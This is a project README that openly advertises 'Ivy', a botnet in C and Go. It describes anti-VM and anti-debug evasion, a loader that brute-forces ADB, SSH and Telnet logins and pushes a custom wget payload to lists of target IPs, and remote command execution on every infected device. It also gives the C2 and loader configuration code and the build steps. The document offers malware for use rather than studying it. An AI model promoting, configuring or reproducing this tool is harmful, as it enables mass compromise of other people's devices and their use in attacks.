<h1 align="center">
	<img src="https://user-images.githubusercontent.com/95945026/145702221-ed6d438c-436c-47b9-8e9f-c9223963394b.png" width="150px"><br>
    ivy - A botnet written in C and Golang.
</h1>
<p align="center">
    Ivy is a large, feature-rich botnet written in C and Golang that is
    extremely easy to use, and comes with a built-in loader.
</p>

<p align="center">
	<a href="https://deno.land" target="_blank">
    	<img src="https://img.shields.io/badge/Version-1.0.0-7DCDE3?style=for-the-badge" alt="Version">
</p>

## Features
Feature  | Description
-------- | -----------
Anti VM | The bot for Ivy checks if it's being ran in a virtual machine by checking for the uptime and hardware specifications. If it detects anything suspicious, it exits.
Anti Debug | The bot for Ivy checks if it's being debugged. If it is, it exits.
Loader | Ivy has a built-in loader that can brute and send payloads to devices via ADB, SSH, and Telnet.
Command Execution | You can remotely execute system commands on all the connected devices.
Configuration | Ivy makes it extremely easy to configure the loader, bot, and C2.

## Bot Configuration
The configuration file for the bot is located in `util/bot/includes/config/config.h`.
```c
#pragma once


/*
    *    util/bot/includes/config/config.h
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


#define C2_IP "127.0.0.1"
#define C2_PORT 1337
```
	
## Server Configuration
The configuration file for the server is located in `util/config/config.go`.
```go
package config

import (
	"net"
)


/*
    *    util/config/config.go
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


var Bots []net.Conn /* Don't touch this! */
var BotCount int = 0 /* Don't touch this! */

/* Server Configuration */
const (
    C2_IP = "127.0.0.1" /* Server IP! */
    C2_PORT = "1337" /* Server Port! */
    MAX_BOTS = 1024 /* Max amount of bots allowed to connect to the server! */
)

/* Loader Configuration */
const (
    LOADER_ENABLE = false /* Set this to 'true' if you want to use the loader! */
    LOADER_PAYLOAD = "" /* Add your own custom wget payload here! */
    LOADER_OPTION = "" /* The options are '--adb', '--ssh', and '--telnet'! */
    LOADER_IP_LIST = "" /* Add your list containing the IP addresses of targets! */
    LOADER_BRUTE_LIST = "" /* Add your list containing the username/password combinations to brute against the target! */
)
```

## Setup & Installation
```
Steps for compiling & running:
go mod init ivy
go mod tidy
  ./compile.sh
```

## Screenshots
![image](https://user-images.githubusercontent.com/95945026/145702343-1c574e9e-afe3-435a-ad76-9cfb15d2c9f4.png)

## Credits
```
https://github.com/0x80000000
```

### Contributions 🎉
###### All contributions are accepted, simply open an Issue / Pull request.
